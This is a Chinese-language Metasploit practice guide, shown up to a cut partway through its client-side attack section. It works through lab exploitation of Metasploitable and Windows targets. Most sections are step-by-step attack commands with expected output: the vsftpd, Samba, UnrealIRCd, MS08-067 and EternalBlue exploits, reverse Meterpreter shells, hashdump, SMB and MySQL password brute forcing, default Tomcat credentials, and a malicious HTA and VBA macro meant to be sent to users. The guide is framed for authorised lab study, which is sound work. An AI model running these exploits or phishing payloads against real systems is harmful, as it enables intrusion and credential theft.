

> Metasploit Framework (MSF) 经典实践项目大全
> 本笔记涵盖从入门到高级的所有经典渗透测试实践项目
> 基于 Metasploit 6.x 版本，运行环境为 Kali Linux
> 更新日期：2025年12月

---

## 目录

1. [环境准备与基础配置](#1-环境准备与基础配置)
2. [入门级实践项目](#2-入门级实践项目)
3. [初级实践项目](#3-初级实践项目)
4. [中级实践项目](#4-中级实践项目)
5. [高级实践项目](#5-高级实践项目)
6. [专家级实践项目](#6-专家级实践项目)
7. [红队实战项目](#7-红队实战项目)
8. [自动化与脚本开发](#8-自动化与脚本开发)
9. [常见错误与解决方案](#9-常见错误与解决方案)
10. [最佳实践与安全建议](#10-最佳实践与安全建议)

---

## 1. 环境准备与基础配置

### 1.1 实验环境搭建

在开始任何渗透测试实践之前，搭建一个安全、合法的实验环境是至关重要的。我们绝对不能在未经授权的系统上进行测试，这不仅违法，还可能造成严重后果。

#### 1.1.1 推荐的靶机环境

以下是一些常用的合法靶机环境，它们专门设计用于安全学习和测试：

| 靶机名称 | 难度 | 说明 | 下载地址 |
|----------|------|------|----------|
| Metasploitable 2 | 入门 | 专为 MSF 设计的 Linux 靶机 | SourceForge |
| Metasploitable 3 | 中级 | Windows/Linux 双版本 | GitHub |
| DVWA | 入门 | Web 漏洞练习平台 | GitHub |
| VulnHub 系列 | 各级 | 大量 CTF 风格靶机 | vulnhub.com |
| HackTheBox | 各级 | 在线渗透测试平台 | hackthebox.com |
| TryHackMe | 各级 | 引导式学习平台 | tryhackme.com |


#### 1.1.2 虚拟化环境配置

```bash
# 推荐使用 VMware 或 VirtualBox 搭建隔离网络
# 网络配置示例（VMware）：
# - Kali Linux (攻击机): 192.168.1.50
# - Metasploitable 2 (靶机): 192.168.1.100
# - Windows 7 (靶机): 192.168.1.101

# 确保虚拟机网络设置为 NAT 或 Host-Only
# 这样可以隔离实验环境，避免影响真实网络
```

```
┌─────────────────────────────────────────────────────────────────┐
│                    实验网络拓扑图                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   ┌──────────────┐         ┌──────────────┐                    │
│   │  Kali Linux  │         │ Metasploitable│                   │
│   │  攻击机      │◄───────►│   靶机        │                   │
│   │ 192.168.1.50 │         │ 192.168.1.100 │                   │
│   └──────────────┘         └──────────────┘                    │
│          │                        │                             │
│          │    ┌──────────────┐    │                             │
│          └───►│  虚拟交换机  │◄───┘                             │
│               │  (Host-Only) │                                  │
│               └──────────────┘                                  │
│                      │                                          │
│               ┌──────────────┐                                  │
│               │  Windows 7   │                                  │
│               │   靶机       │                                  │
│               │ 192.168.1.101│                                  │
│               └──────────────┘                                  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 1.2 Metasploit 初始化配置

在开始实践之前，我们需要确保 Metasploit 正确配置并连接到数据库。数据库对于存储扫描结果、管理会话和组织项目非常重要。

```bash
# 1. 启动 PostgreSQL 数据库服务
sudo systemctl start postgresql
sudo systemctl enable postgresql  # 设置开机自启

# 2. 初始化 Metasploit 数据库
sudo msfdb init

# 输出示例：
# [+] Starting database
# [+] Creating database user 'msf'
# [+] Creating databases 'msf'
# [+] Creating databases 'msf_test'
# [+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
# [+] Creating initial database schema

# 3. 检查数据库状态
sudo msfdb status

# 4. 启动 msfconsole
msfconsole

# 5. 在 msfconsole 中验证数据库连接
msf6 > db_status
# [*] Connected to msf. Connection type: postgresql.
```

### 1.3 工作区管理

工作区是 Metasploit 中组织不同渗透测试项目的方式。每个工作区都有独立的主机、服务、漏洞和凭证数据。

```bash
# 查看当前工作区
msf6 > workspace
# * default

# 创建新工作区
msf6 > workspace -a lab_practice
# [*] Added workspace: lab_practice
# [*] Workspace: lab_practice

# 切换工作区
msf6 > workspace default
msf6 > workspace lab_practice

# 删除工作区
msf6 > workspace -d old_project

# 重命名工作区
msf6 > workspace -r old_name new_name

# 列出所有工作区及其统计信息
msf6 > workspace -v
```

---

## 2. 入门级实践项目

这一部分包含最基础的实践项目，适合刚开始学习 Metasploit 的新手。这些项目帮助你熟悉基本操作流程和核心概念。

### 2.1 项目一：基础端口扫描与服务识别

**目标**：学习使用 Metasploit 进行网络侦察，识别目标主机开放的端口和运行的服务。

**难度**：★☆☆☆☆

**前置知识**：基本的网络知识，了解 TCP/IP 协议

#### 2.1.1 项目背景

端口扫描是渗透测试的第一步。通过扫描，我们可以了解目标系统开放了哪些端口，运行着什么服务。这些信息对于后续的漏洞利用至关重要。

#### 2.1.2 实践步骤

```bash
# 步骤 1：启动 msfconsole 并确认数据库连接
msfconsole -q
msf6 > db_status

# 步骤 2：创建专用工作区
msf6 > workspace -a port_scan_lab
```

```bash
# 步骤 3：使用 db_nmap 进行扫描（推荐方式，结果自动存入数据库）
msf6 > db_nmap -sS -sV -O 192.168.1.100

# 参数说明：
# -sS: SYN 扫描（半开放扫描，速度快且隐蔽）
# -sV: 服务版本检测
# -O:  操作系统检测

# 步骤 4：查看扫描结果
msf6 > hosts           # 查看发现的主机
msf6 > services        # 查看发现的服务
msf6 > services -p 22,80,445  # 按端口过滤

# 步骤 5：使用 Metasploit 内置扫描模块
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > show options
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 1-1000
msf6 auxiliary(scanner/portscan/tcp) > set THREADS 50
msf6 auxiliary(scanner/portscan/tcp) > run
```

#### 2.1.3 预期输出

```
[*] 192.168.1.100:21 - TCP OPEN
[*] 192.168.1.100:22 - TCP OPEN
[*] 192.168.1.100:23 - TCP OPEN
[*] 192.168.1.100:25 - TCP OPEN
[*] 192.168.1.100:80 - TCP OPEN
[*] 192.168.1.100:139 - TCP OPEN
[*] 192.168.1.100:445 - TCP OPEN
[*] 192.168.1.100:3306 - TCP OPEN
```

#### 2.1.4 常见错误与解决

| 错误信息 | 原因 | 解决方案 |
|----------|------|----------|
| `RHOSTS is not set` | 未设置目标主机 | `set RHOSTS <IP>` |
| `Connection refused` | 目标主机未开机或防火墙阻止 | 检查网络连通性 |
| `Database not connected` | 数据库未启动 | `sudo msfdb start` |
| `Permission denied` | SYN 扫描需要 root 权限 | 使用 `sudo msfconsole` |

### 2.2 项目二：SMB 服务枚举

**目标**：学习枚举 Windows SMB 服务，获取用户、共享等信息。

**难度**：★☆☆☆☆

**前置知识**：了解 SMB 协议基础

#### 2.2.1 项目背景

SMB（Server Message Block）是 Windows 系统中用于文件共享的协议。通过枚举 SMB 服务，我们可以获取大量有价值的信息，如用户名、共享文件夹、系统版本等。

#### 2.2.2 实践步骤

```bash
# 步骤 1：SMB 版本扫描
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/smb/smb_version) > run

# 预期输出：
# [*] 192.168.1.100:445 - SMB Detected (versions:1) (preferred dialect:) 
#     (signatures:optional) (uptime:1h 23m 45s) (guid:{...})
#     (authentication domain:WORKGROUP) Windows 5.1 (language:English)

# 步骤 2：枚举 SMB 共享
msf6 > use auxiliary/scanner/smb/smb_enumshares
msf6 auxiliary(scanner/smb/smb_enumshares) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/smb/smb_enumshares) > run

# 步骤 3：枚举 SMB 用户
msf6 > use auxiliary/scanner/smb/smb_enumusers
msf6 auxiliary(scanner/smb/smb_enumusers) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/smb/smb_enumusers) > run

# 步骤 4：枚举 SMB 登录策略
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/smb/smb_login) > set SMBUser administrator
msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/smb/smb_login) > run
```

#### 2.2.3 常见错误与解决

```bash
# 错误：STATUS_ACCESS_DENIED
# 原因：没有足够权限访问 SMB 服务
# 解决：尝试使用有效凭证或匿名访问

# 错误：Connection reset by peer
# 原因：SMB 服务未启动或被防火墙阻止
# 解决：确认目标 445 端口开放

# 错误：Login Failed
# 原因：凭证错误
# 解决：检查用户名密码，或尝试其他凭证
```

### 2.3 项目三：FTP 匿名登录检测与利用

**目标**：检测并利用 FTP 服务的匿名登录漏洞。

**难度**：★☆☆☆☆

**前置知识**：了解 FTP 协议基础

#### 2.3.1 项目背景

FTP（文件传输协议）服务如果配置不当，可能允许匿名用户登录。这是一个常见的安全配置错误，攻击者可以利用它获取敏感文件或上传恶意文件。

#### 2.3.2 实践步骤

```bash
# 步骤 1：扫描 FTP 版本
msf6 > use auxiliary/scanner/ftp/ftp_version
msf6 auxiliary(scanner/ftp/ftp_version) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/ftp/ftp_version) > run

# 步骤 2：检测匿名登录
msf6 > use auxiliary/scanner/ftp/anonymous
msf6 auxiliary(scanner/ftp/anonymous) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/ftp/anonymous) > run

# 预期输出（如果允许匿名登录）：
# [+] 192.168.1.100:21 - 192.168.1.100:21 - Anonymous READ (220 (vsFTPd 2.3.4))

# 步骤 3：手动连接验证
# 在终端中：
ftp 192.168.1.100
# 用户名：anonymous
# 密码：（直接回车或输入任意邮箱）
```

---

## 3. 初级实践项目

这一部分的项目开始涉及实际的漏洞利用，但都是相对简单和经典的漏洞。

### 3.1 项目四：vsftpd 2.3.4 后门利用

**目标**：利用 vsftpd 2.3.4 版本中的后门漏洞获取 root shell。

**难度**：★★☆☆☆

**靶机**：Metasploitable 2

#### 3.1.1 漏洞背景

2011年，vsftpd 2.3.4 的源代码被植入了一个后门。当用户名以 `:)` 结尾时，会在 6200 端口打开一个 root shell。这是一个经典的供应链攻击案例。

#### 3.1.2 实践步骤

```bash
# 步骤 1：确认目标运行 vsftpd 2.3.4
msf6 > use auxiliary/scanner/ftp/ftp_version
msf6 auxiliary(scanner/ftp/ftp_version) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/ftp/ftp_version) > run

# 预期输出：
# [+] 192.168.1.100:21 - FTP Banner: '220 (vsFTPd 2.3.4)'

# 步骤 2：搜索并使用漏洞利用模块
msf6 > search vsftpd
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor

# 步骤 3：查看模块信息
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > info

# 步骤 4：配置参数
msf6 exploit(...) > show options
msf6 exploit(...) > set RHOSTS 192.168.1.100

# 步骤 5：执行漏洞利用
msf6 exploit(...) > exploit

# 预期输出：
# [*] 192.168.1.100:21 - Banner: 220 (vsFTPd 2.3.4)
# [*] 192.168.1.100:21 - USER: 331 Please specify the password.
# [+] 192.168.1.100:21 - Backdoor service has been spawned, handling...
# [+] 192.168.1.100:21 - UID: uid=0(root) gid=0(root)
# [*] Found shell.
# [*] Command shell session 1 opened

# 步骤 6：验证权限
id
# uid=0(root) gid=0(root)
whoami
# root
```

#### 3.1.3 漏洞原理图解

```
┌─────────────────────────────────────────────────────────────────┐
│                vsftpd 2.3.4 后门触发流程                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   攻击者                          vsftpd 服务器                 │
│     │                                  │                        │
│     │  1. 连接 FTP (端口 21)           │                        │
│     │─────────────────────────────────►│                        │
│     │                                  │                        │
│     │  2. 发送用户名 "user:)"          │                        │
│     │─────────────────────────────────►│                        │
│     │                                  │                        │
│     │                    3. 后门触发，开放 6200 端口            │
│     │                                  │                        │
│     │  4. 连接后门端口 6200            │                        │
│     │─────────────────────────────────►│                        │
│     │                                  │                        │
│     │  5. 获得 root shell              │                        │
│     │◄─────────────────────────────────│                        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

#### 3.1.4 常见错误与解决

| 错误信息 | 原因 | 解决方案 |
|----------|------|----------|
| `Exploit completed, but no session was created` | 后门端口被防火墙阻止 | 检查 6200 端口是否可达 |
| `Connection refused` | FTP 服务未运行 | 确认目标 21 端口开放 |
| `Banner: 220 (vsFTPd 3.x.x)` | 版本不受影响 | 此漏洞仅影响 2.3.4 版本 |

### 3.2 项目五：Samba usermap_script 漏洞利用

**目标**：利用 Samba 的命令注入漏洞获取 shell。

**难度**：★★☆☆☆

**靶机**：Metasploitable 2

**CVE编号**：CVE-2007-2447

#### 3.2.1 漏洞背景

Samba 3.0.20 到 3.0.25rc3 版本中存在一个命令注入漏洞。当使用非默认的 "username map script" 配置时，攻击者可以通过在用户名中注入 shell 元字符来执行任意命令。

#### 3.2.2 实践步骤

```bash
# 步骤 1：确认 Samba 版本
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/smb/smb_version) > run

# 步骤 2：搜索漏洞模块
msf6 > search samba usermap
# 或
msf6 > search CVE-2007-2447

# 步骤 3：使用漏洞利用模块
msf6 > use exploit/multi/samba/usermap_script

# 步骤 4：查看并配置参数
msf6 exploit(multi/samba/usermap_script) > show options
msf6 exploit(...) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set PAYLOAD cmd/unix/reverse

# 步骤 5：设置监听参数
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > set LPORT 4444

# 步骤 6：执行漏洞利用
msf6 exploit(...) > exploit

# 预期输出：
# [*] Started reverse TCP double handler on 192.168.1.50:4444
# [*] Accepted the first client connection...
# [*] Accepted the second client connection...
# [*] Command: echo xxxxxxxx;
# [*] Writing to socket A
# [*] Writing to socket B
# [*] Reading from sockets...
# [*] Reading from socket A
# [*] A]A is input...
# [*] Command shell session 1 opened

# 步骤 7：验证
id
whoami
```

### 3.3 项目六：UnrealIRCd 后门利用

**目标**：利用 UnrealIRCd 3.2.8.1 中的后门获取 shell。

**难度**：★★☆☆☆

**靶机**：Metasploitable 2

#### 3.3.1 漏洞背景

2009-2010年间，UnrealIRCd 3.2.8.1 的官方下载包被植入后门。攻击者可以通过发送特定字符串 "AB;" 后跟系统命令来执行任意代码。

#### 3.3.2 实践步骤

```bash
# 步骤 1：扫描 IRC 服务
msf6 > db_nmap -sV -p 6667 192.168.1.100

# 步骤 2：搜索并使用漏洞模块
msf6 > search unrealircd
msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor

# 步骤 3：配置参数
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set PAYLOAD cmd/unix/reverse
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > set LPORT 4444

# 步骤 4：执行
msf6 exploit(...) > exploit

# 成功后获得 shell
id
# uid=0(root) gid=0(root)
```

### 3.4 项目七：Tomcat 管理器弱口令利用

**目标**：利用 Tomcat 管理器的弱口令上传 WAR 文件获取 shell。

**难度**：★★☆☆☆

**靶机**：Metasploitable 2 或任何配置了弱口令的 Tomcat 服务器

#### 3.4.1 漏洞背景

Apache Tomcat 的管理器应用（Manager App）允许管理员部署 WAR 文件。如果管理器使用弱口令或默认凭证，攻击者可以上传恶意 WAR 文件获取服务器控制权。

#### 3.4.2 实践步骤

```bash
# 步骤 1：扫描 Tomcat 服务
msf6 > db_nmap -sV -p 8080 192.168.1.100

# 步骤 2：暴力破解 Tomcat 管理器凭证
msf6 > use auxiliary/scanner/http/tomcat_mgr_login
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > set RPORT 8080
msf6 auxiliary(...) > set STOP_ON_SUCCESS true
msf6 auxiliary(...) > run

# 预期输出：
# [+] 192.168.1.100:8080 - Login Successful: tomcat:tomcat

# 步骤 3：使用获取的凭证上传恶意 WAR
msf6 > use exploit/multi/http/tomcat_mgr_upload
msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set RPORT 8080
msf6 exploit(...) > set HttpUsername tomcat
msf6 exploit(...) > set HttpPassword tomcat
msf6 exploit(...) > set PAYLOAD java/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > set LPORT 4444

# 步骤 4：执行漏洞利用
msf6 exploit(...) > exploit

# 预期输出：
# [*] Started reverse TCP handler on 192.168.1.50:4444
# [*] Retrieving session ID and CSRF token...
# [*] Uploading and deploying xxxxxxxx.war ...
# [*] Executing xxxxxxxx...
# [*] Undeploying xxxxxxxx ...
# [*] Sending stage (58829 bytes) to 192.168.1.100
# [*] Meterpreter session 1 opened

# 步骤 5：在 Meterpreter 中操作
meterpreter > sysinfo
meterpreter > getuid
meterpreter > shell
```

#### 3.4.3 常见 Tomcat 默认凭证

| 用户名 | 密码 |
|--------|------|
| tomcat | tomcat |
| admin | admin |
| manager | manager |
| role1 | role1 |
| root | root |
| both | tomcat |

---

## 4. 中级实践项目

这一部分的项目涉及更复杂的漏洞利用场景，需要对系统和网络有更深入的理解。

### 4.1 项目八：MS08-067 漏洞利用（经典 Windows 漏洞）

**目标**：利用 MS08-067 漏洞获取 Windows XP/2003 系统的控制权。

**难度**：★★★☆☆

**靶机**：Windows XP SP2/SP3 或 Windows Server 2003

**CVE编号**：CVE-2008-4250

#### 4.1.1 漏洞背景

MS08-067 是 Windows Server 服务中的一个远程代码执行漏洞，影响 Windows 2000、XP、Server 2003 等系统。这个漏洞被 Conficker 蠕虫大规模利用，是历史上最著名的 Windows 漏洞之一。

#### 4.1.2 实践步骤

```bash
# 步骤 1：确认目标系统版本
msf6 > db_nmap -sV -O 192.168.1.101

# 步骤 2：检测漏洞是否存在
msf6 > use auxiliary/scanner/smb/ms08_067_check
msf6 auxiliary(scanner/smb/ms08_067_check) > set RHOSTS 192.168.1.101
msf6 auxiliary(...) > run

# 预期输出：
# [+] 192.168.1.101:445 - Host is likely VULNERABLE to MS08-067!

# 步骤 3：使用漏洞利用模块
msf6 > use exploit/windows/smb/ms08_067_netapi
msf6 exploit(windows/smb/ms08_067_netapi) > show options

# 步骤 4：查看可用目标（非常重要！）
msf6 exploit(...) > show targets

# 输出示例：
#    Id  Name
#    --  ----
#    0   Automatic Targeting
#    1   Windows 2000 Universal
#    ...
#    34  Windows XP SP3 Chinese - Simplified (NX)
#    ...

# 步骤 5：配置参数
msf6 exploit(...) > set RHOSTS 192.168.1.101
msf6 exploit(...) > set TARGET 34  # 根据目标系统选择
msf6 exploit(...) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > set LPORT 4444

# 步骤 6：执行漏洞利用
msf6 exploit(...) > exploit

# 成功后进入 Meterpreter
meterpreter > sysinfo
meterpreter > getuid
meterpreter > hashdump
```

#### 4.1.3 目标选择的重要性

MS08-067 漏洞利用对目标系统版本非常敏感。选择错误的目标可能导致：
- 漏洞利用失败
- 目标系统蓝屏崩溃
- 服务异常

```bash
# 如何确定正确的目标：
# 1. 使用 Nmap 识别操作系统
msf6 > db_nmap -O 192.168.1.101

# 2. 使用 SMB 版本扫描
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(...) > set RHOSTS 192.168.1.101
msf6 auxiliary(...) > run

# 3. 如果不确定，可以使用 Automatic Targeting (TARGET 0)
# 但成功率可能较低
```

#### 4.1.4 常见错误与解决

| 错误信息 | 原因 | 解决方案 |
|----------|------|----------|
| `Exploit completed, but no session was created` | 目标选择错误 | 尝试不同的 TARGET 值 |
| `Rex::ConnectionRefused` | SMB 服务未开放 | 确认 445 端口开放 |
| `Target system has been patched` | 系统已打补丁 | 此漏洞无法利用 |
| `BSOD (蓝屏)` | 目标选择错误或系统不稳定 | 重启靶机，选择正确目标 |

### 4.2 项目九：MS17-010 永恒之蓝漏洞利用

**目标**：利用永恒之蓝漏洞获取 Windows 7/2008/2012 系统控制权。

**难度**：★★★☆☆

**靶机**：未打补丁的 Windows 7/Server 2008 R2/Server 2012

**CVE编号**：CVE-2017-0144

#### 4.2.1 漏洞背景

MS17-010（永恒之蓝）是 2017 年由 Shadow Brokers 泄露的 NSA 网络武器之一。这个漏洞影响 Windows SMBv1 协议，被 WannaCry 和 NotPetya 勒索软件大规模利用，造成了全球性的网络安全事件。

#### 4.2.2 实践步骤

```bash
# 步骤 1：检测目标是否存在漏洞
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.1.101
msf6 auxiliary(...) > run

# 预期输出：
# [+] 192.168.1.101:445 - Host is likely VULNERABLE to MS17-010!
#     - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)

# 步骤 2：选择漏洞利用模块
msf6 > search ms17-010 type:exploit

# 主要模块：
# exploit/windows/smb/ms17_010_eternalblue     - 原始 EternalBlue
# exploit/windows/smb/ms17_010_psexec          - 使用 PsExec 方式
# exploit/windows/smb/ms17_010_eternalblue_win8 - Windows 8+ 专用

# 步骤 3：使用 EternalBlue 模块
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# 步骤 4：配置参数
msf6 exploit(...) > set RHOSTS 192.168.1.101
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > set LPORT 4444

# 步骤 5：执行漏洞利用
msf6 exploit(...) > exploit

# 预期输出：
# [*] Started reverse TCP handler on 192.168.1.50:4444
# [*] 192.168.1.101:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
# [+] 192.168.1.101:445 - Host is likely VULNERABLE to MS17-010!
# [*] 192.168.1.101:445 - Connecting to target for exploitation.
# [+] 192.168.1.101:445 - Connection established for exploitation.
# [+] 192.168.1.101:445 - Target OS selected valid for OS indicated by SMB reply
# [*] 192.168.1.101:445 - CORE raw buffer dump (42 bytes)
# [*] 192.168.1.101:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
# [*] 192.168.1.101:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
# [*] 192.168.1.101:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
# [+] 192.168.1.101:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
# [*] 192.168.1.101:445 - Sending egg to corrupted connection.
# [*] 192.168.1.101:445 - Triggering free of corrupted buffer.
# [*] Sending stage (200774 bytes) to 192.168.1.101
# [+] 192.168.1.101:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
# [+] 192.168.1.101:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
# [+] 192.168.1.101:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
# [*] Meterpreter session 1 opened

# 步骤 6：后渗透操作
meterpreter > sysinfo
meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM
meterpreter > hashdump
```

#### 4.2.3 漏洞利用流程图

```
┌─────────────────────────────────────────────────────────────────┐
│                  MS17-010 漏洞利用流程                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   1. SMB 协议握手                                               │
│      攻击者 ──────────────────────────────────► 目标            │
│                                                                 │
│   2. 发送恶意 SMB 数据包（触发缓冲区溢出）                      │
│      攻击者 ──────────────────────────────────► 目标            │
│                                                                 │
│   3. 内核内存被覆盖，执行 Shellcode                             │
│                                                                 │
│   4. Shellcode 建立反向连接                                     │
│      攻击者 ◄────────────────────────────────── 目标            │
│                                                                 │
│   5. 获得 SYSTEM 权限的 Meterpreter 会话                        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

#### 4.2.4 常见错误与解决

```bash
# 错误 1：Exploit completed, but no session was created
# 可能原因：
# - 目标系统已打补丁
# - 防火墙阻止了反向连接
# - Payload 架构不匹配（32位/64位）

# 解决方案：
# 1. 确认漏洞存在
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(...) > set RHOSTS 192.168.1.101
msf6 auxiliary(...) > run

# 2. 检查 Payload 架构
# 64位系统使用：windows/x64/meterpreter/reverse_tcp
# 32位系统使用：windows/meterpreter/reverse_tcp

# 3. 尝试使用 bind_tcp 而不是 reverse_tcp
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/bind_tcp

# 错误 2：Target is not vulnerable
# 原因：系统已打 MS17-010 补丁
# 解决：此漏洞无法利用，尝试其他攻击向量

# 错误 3：Connection reset by peer
# 原因：SMB 服务崩溃或防火墙阻止
# 解决：等待服务恢复或检查网络连通性
```

### 4.3 项目十：Java RMI 反序列化漏洞利用

**目标**：利用 Java RMI 服务的反序列化漏洞获取 shell。

**难度**：★★★☆☆

**靶机**：运行 Java RMI 服务的系统

#### 4.3.1 漏洞背景

Java RMI（远程方法调用）服务在处理序列化对象时存在安全问题。攻击者可以发送恶意序列化对象，在目标系统上执行任意代码。

#### 4.3.2 实践步骤

```bash
# 步骤 1：扫描 RMI 服务
msf6 > use auxiliary/scanner/misc/java_rmi_server
msf6 auxiliary(scanner/misc/java_rmi_server) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > run

# 步骤 2：使用漏洞利用模块
msf6 > use exploit/multi/misc/java_rmi_server
msf6 exploit(multi/misc/java_rmi_server) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set PAYLOAD java/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > exploit
```

### 4.4 项目十一：PostgreSQL 漏洞利用

**目标**：利用 PostgreSQL 的配置漏洞获取系统访问权限。

**难度**：★★★☆☆

**靶机**：Metasploitable 2

#### 4.4.1 实践步骤

```bash
# 步骤 1：扫描 PostgreSQL 服务
msf6 > use auxiliary/scanner/postgres/postgres_login
msf6 auxiliary(scanner/postgres/postgres_login) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > run

# 预期输出：
# [+] 192.168.1.100:5432 - Login Successful: postgres:postgres

# 步骤 2：利用 PostgreSQL 执行系统命令
msf6 > use exploit/linux/postgres/postgres_payload
msf6 exploit(linux/postgres/postgres_payload) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set USERNAME postgres
msf6 exploit(...) > set PASSWORD postgres
msf6 exploit(...) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > exploit
```

### 4.5 项目十二：MySQL 漏洞利用

**目标**：利用 MySQL 的弱口令和 UDF 提权获取系统权限。

**难度**：★★★☆☆

**靶机**：Metasploitable 2

#### 4.5.1 实践步骤

```bash
# 步骤 1：扫描 MySQL 版本
msf6 > use auxiliary/scanner/mysql/mysql_version
msf6 auxiliary(scanner/mysql/mysql_version) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > run

# 步骤 2：暴力破解 MySQL 凭证
msf6 > use auxiliary/scanner/mysql/mysql_login
msf6 auxiliary(scanner/mysql/mysql_login) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > set USERNAME root
msf6 auxiliary(...) > set BLANK_PASSWORDS true
msf6 auxiliary(...) > run

# 步骤 3：枚举 MySQL 信息
msf6 > use auxiliary/admin/mysql/mysql_enum
msf6 auxiliary(admin/mysql/mysql_enum) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > set USERNAME root
msf6 auxiliary(...) > set PASSWORD ""
msf6 auxiliary(...) > run

# 步骤 4：利用 MySQL UDF 提权
msf6 > use exploit/multi/mysql/mysql_udf_payload
msf6 exploit(multi/mysql/mysql_udf_payload) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set USERNAME root
msf6 exploit(...) > set PASSWORD ""
msf6 exploit(...) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > exploit
```

---

## 5. 高级实践项目

这一部分的项目涉及更复杂的攻击场景，包括客户端攻击、Web 应用漏洞利用和权限提升。

### 5.1 项目十三：客户端攻击 - 恶意文档生成

**目标**：生成恶意 Office 文档，通过社会工程学获取目标系统控制权。

**难度**：★★★★☆

#### 5.1.1 攻击背景

客户端攻击是指通过诱导用户打开恶意文件或访问恶意链接来获取系统访问权限。这种攻击方式在实际渗透测试中非常常见，因为它可以绑过防火墙等网络安全设备。

#### 5.1.2 生成恶意 HTA 文件

```bash
# 步骤 1：使用 HTA 攻击模块
msf6 > use exploit/windows/misc/hta_server
msf6 exploit(windows/misc/hta_server) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > set LPORT 4444
msf6 exploit(...) > set SRVHOST 192.168.1.50
msf6 exploit(...) > set SRVPORT 8080
msf6 exploit(...) > exploit

# 输出：
# [*] Exploit running as background job 0.
# [*] Started reverse TCP handler on 192.168.1.50:4444
# [*] Using URL: http://192.168.1.50:8080/xxxxx.hta
# [*] Server started.

# 将生成的 URL 发送给目标用户
# 当用户访问并运行 HTA 文件时，将获得 Meterpreter 会话
```

#### 5.1.3 生成恶意 Office 宏文档

```bash
# 步骤 1：使用 msfvenom 生成 VBA 宏代码
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f vba

# 步骤 2：将生成的代码复制到 Word/Excel 宏中
# 1. 打开 Word/Excel
# 2. 按 Alt+F11 打开 VBA 编辑器
# 3. 插入新模块，粘贴代码
# 4. 保存为 .docm 或 .xlsm 格式

# 步骤 3：设置监听器
msf6 > use exploit/multi/handler
